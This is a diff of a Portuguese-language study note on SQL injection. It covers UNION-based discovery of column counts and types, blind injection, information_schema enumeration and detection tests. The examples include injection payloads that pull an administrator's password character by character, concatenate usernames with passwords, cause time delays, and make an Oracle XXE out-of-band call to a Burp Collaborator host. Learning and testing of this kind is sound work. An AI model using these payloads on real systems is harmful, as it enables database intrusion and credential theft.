@@ -91,31 +91,61 @@ blabla '' ORDER BY NULL, NULL -- tabela tem pelo menos 2 colunas se não retorna
 blabla '' ORDER BY NULL, NULL, NULL -- tabela tem pelo menos 3 colunas se não retornar erro
 ```
 
-### [Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
+#### Descobrir tipo de dado de certa coluna
+Sabendo o número de colunas da tabela é possível descobrir o tipo de dado em cada coluna. Para isso, é necessário realizar testes com _queries_ do tipo:
+``` SQL
+blabla '' UNION SELECT 'a',NULL,NULL,NULL --
+blabla '' UNION SELECT NULL,'a',NULL,NULL --
+blabla '' UNION SELECT NULL,NULL,'a',NULL --
+blabla '' UNION SELECT NULL,NULL,NULL,'a'--
+```
+Ao submeter, por exemplo, `' UNION SELECT 'a',NULL,NULL,NULL --`, testaremos se a 1ª coluna contém strings, pois estamos fazendo um UNION, ou seja, o dado da 1ª coluna do 1º SELECT deve ser do mesmo tipo que o da 1ª coluna do 2º SELECT (o mesmo vale para as outras colunas). Caso o servidor responda com um erro (como `Conversion failed when converting the varchar value 'a' to data type int.`), sabemos que a primeira coluna não contém strings (varchar). Do contrário, se a _query_ for um sucesso, a primeira coluna armazena strings.
 
-- Em DBs da Oracle, um SELECT sempre deve conter um FROM <nome_da_tabela>. Para isso, uma tabela padrão é DUAL
-
-- Para descobrir o número de colunas da tabela usa-se ORDER BY 1,2 ..., N ou ORDER BY NULL, NULL, ..., NULL (null "é de todo tipo")
-- Para descobrir o tipo de dado de cada coluno basta ir substituindo cada NULL (do ORDER BY) por uma string, int, char etc.
-- Exibir lista de tabelas do DB (exceto Oracle): SELECT * FROM information_schema.tables
-- Exibir lista de colunas de uma tabela: SELECT * FROM information_schema.columns WHERE table_name = 'Users'
-- Em DBs da Oracle, usa-se: SELECT * FROM all_tables (achar tabelas) e SELECT * FROM all_tab_columns WHERE table_name = 'nome_da_tabela' (achar colunas)
-- Para concatenar resultados (colunas diferentes), pode-se usar o `||`: `' UNION SELECT username || '~' || password FROM users -- -` (ORACLE e POSTGRE) ou `'foo'+'bar'` (MICROSOFT) ou `'foo' 'bar'` e `CONCAT('foo','bar')` (MYSQL)
-
-BLIND SQL INJECTION:
-- Check the beggining of a password by using SUBSTRING: `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '` + `xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 'm'--` -> if TRUE, the 1st password letter is greater than 'm' (SUBSTR or SUBSTRING depends on the database)
-- Another possible check is: `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '` + `xyz' UNION SELECT 'a' WHERE 1=1--`
-- [OAST payloads are a thing?](https://portswigger.net/blog/oast-out-of-band-application-security-testing)
-
-https://portswigger.net/web-security/sql-injection
-
-https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
-
-https://portswigger.net/web-security/sql-injection/cheat-sheet
-
-https://owasp.org/www-community/attacks/SQL_Injection
-
-https://www.acunetix.com/websitesecurity/sql-injection/
+`NULL` pode ser convertido para qualquer tipo, portanto não haverá problemas relacionados a tipos de dado incompatíveis ao utilizá-lo num UNION.
 
 
-https://portswigger.net/burp/application-security-testing
+## [Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
+Já escrevi muita coisa, pesquisem!
+- Checar o começo de uma senha com `SUBSTRING`: `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '` + `pwn' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 'm'--` -> `TRUE` => 1ª letra da senha é maior que 'm'(usar SUBSTR ou SUBSTRING - depende do DB)
+- Outra possibilidade de teste é: `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '` + `pwn' UNION SELECT 'a' WHERE 1=1--`
+
+## Extra
+- Para exibir a lista de tabelas do DB (exceto DBs da Oracle): 
+``` SQL
+SELECT * FROM information_schema.tables
+```
+
+-Para  exibir lista de colunas de uma tabela: 
+``` SQL
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+```
+
+- Em DBs da Oracle, usa-se: 
+``` SQL
+SELECT * FROM all_tables -- listar tabelas
+SELECT * FROM all_tab_columns WHERE table_name = 'nome_da_tabela' -- listar colunas
+```
+
+- Em DBs da Oracle, um `SELECT` sempre deve conter um `FROM <nome_da_tabela>`. Para isso, uma tabela "padrão" para se usar é `DUAL`
+
+- Para concatenar resultados (colunas diferentes) em uma coluna, pode-se usar o `||`: `' UNION SELECT username || '~' || password FROM users -- -` (ORACLE e POSTGRE) ou `'foo'+'bar'` (MICROSOFT) ou `'foo' 'bar'` e `CONCAT('foo','bar')` (MYSQL)
+
+_Para ver mais, procure por "SQL Injection Cheat Sheets" como [essa](https://portswigger.net/web-security/sql-injection/cheat-sheet) ou [essa](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)._
+
+## Como detectar uma SQL Injection?
+Ferramentas como Burpsuite ou Sqlmap são capazes de detectar diversas vulnerabilidades relacionadas à SQL Injection de forma automática, mas também podemos realizar alguns testes simples para verificar se há falhas no sistema responsável pela comunicação com o banco de dados. Alguns desses testes são:
+
+- Enviar aspas simples (`'`);
+- Enviar condicionais como `OR 1=1` e `OR 1=2`;
+- Enviar _payloads_ com _triggers_ de tempo (_delay_) como `'; IF (1=2) WAITFOR DELAY '0:0:10'--` e analisar o tempo de resposta;
+- Enviar _payloads_ de OAST ([Out-of-band Application Security Testing](https://portswigger.net/blog/oast-out-of-band-application-security-testing)) que causam certos _triggers_ e monitorar interações com sistemas externos
+    - Já que não explicamos sobre isso, segue um exemplo:
+    ``` SQL
+        '||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE root [ <!ENTITY % ekiom SYSTEM "http://pibw1f1nhjh3vpkgtx6mtfnt8kea2eq8dy1n.burpcollab'||'orator.net/"> %ekiom;]>'),'/l') from dual)||' 
+        -- conecta com um servidor de colaborador do Burp (faz uso de XML/DTD)
+    ```
+
+## Links externos
+- [Portswigger](https://portswigger.net/web-security/sql-injection)
+- [OWASP](https://owasp.org/www-community/attacks/SQL_Injection)
+- [Acunetix](https://www.acunetix.com/websitesecurity/sql-injection/)
